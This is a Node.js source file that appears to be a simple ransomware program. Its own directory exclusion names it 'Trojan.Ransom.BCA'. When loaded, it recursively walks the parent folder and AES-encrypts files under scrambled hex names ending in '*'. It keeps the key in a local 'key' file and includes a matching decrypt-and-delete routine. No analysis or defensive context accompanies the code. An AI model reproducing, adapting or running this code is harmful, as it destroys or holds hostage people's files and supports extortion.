const fs = require('fs');
const crypto = require('crypto');
const path = require('path');
const parentDir = __dirname + "/../";
const newKey = crypto.randomBytes(6).toString('base64');

function encrypt (pathIn, key, isDir) {
    const oldName = pathIn.split('/').pop();
    const dir = pathIn.split('/').slice(0, -1).join('/') + '/';
    console.log(dir);
    if (oldName.slice(-1) !== "*") {
        console.log("Encrypt: " + key);
        let tmp = crypto.createCipher('aes-256-cbc', key);
        const newName = tmp.update(oldName, 'utf-8', 'hex') + tmp.final('hex') + "*";

        if (isDir) {
            // fs.rename(pathIn, dir + newName, (err) => {if (err) throw err});
        } else {
            let cipher = crypto.createCipher('aes-256-cbc', key);
            let input = fs.createReadStream(pathIn);
            let output = fs.createWriteStream(dir + newName);

            input.pipe(cipher).pipe(output);

            output.on('finish', function () {
                console.log('Encrypted file written to disk!');
            });
        }
    }
}

function decrypt (pathIn, key, isDir) {
    const oldName = pathIn.split('/').pop();
    const dir = pathIn.split('/').slice(0, -1).join('/') + '/';
    fs.readFile(pathIn, "binary", function (err, data) {
        if (err) throw err;

        if (oldName.slice(-1) === "*") {
            let tmp = crypto.createDecipher('aes-256-cbc', key);
            const newName = tmp.update(oldName.slice(0, -1), 'hex','utf8') + tmp.final('utf8');

            if (isDir) {
                // fs.rename(pathIn, dir + newName, (err) => {if (err) throw err});
            } else {
                let decipher = crypto.createDecipher('aes-256-cbc', key);
                let input = fs.createReadStream(pathIn);
                let output = fs.createWriteStream(dir + "NEW_" + newName);

                input.pipe(decipher).pipe(output);

                output.on('finish', function() {
                    console.log('Decrypted file written to disk!');

                    fs.unlink(pathIn, function (err) {
                        if (err) throw err;
                        console.log('Deleted');
                    });
                });
            }
        }
    });
}

function search (pathIn, mode) {
    fs.readdir(pathIn, function(err, files) {
        if(err) {
            console.error("Could not list the directory.", err );
            process.exit(1);
        }

        let key;
        fs.readFile("key", "utf8", function (err, data) {
            if (err) {
                fs.writeFile("key", newKey, (err) => {if (err) throw err});
                key = newKey;
            } else {
                key = data;
            }

            files.forEach(function(file, index) {
                let filePath = path.join(pathIn, file);

                fs.stat(filePath, function(err, stat) {
                    if (err) {
                        console.error("Error stating file.", err);
                        return;
                    }

                    if(stat.isFile()) {
                        console.log("'%s' is a file.", filePath);

                        let extension = file.split('.').pop();
                        if (file !== ".DS_Store" && !["app", "exe", "localized", "ini"].includes(extension)) {
                            if (mode === 0) encrypt(filePath, key, false);
                            else if (mode === 1) decrypt(filePath, key, false);
                        }
                    } else if(stat.isDirectory()) {
                    console.log( "'%s' is a directory.", filePath);
                    if (file !== "Trojan.Ransom.BCA") {
                        if (mode === 0) encrypt(filePath, key, true);
                        else if (mode === 1) decrypt(filePath, key, true);
                        search(filePath, mode);
                    }
                }

                });
            });
        });
    });
}

/*function process (key) {
    search(0);
    console.log("Process: " + key);
}*/

search(parentDir, 0);

module.exports = {
    process: function () {
        process();
    }
};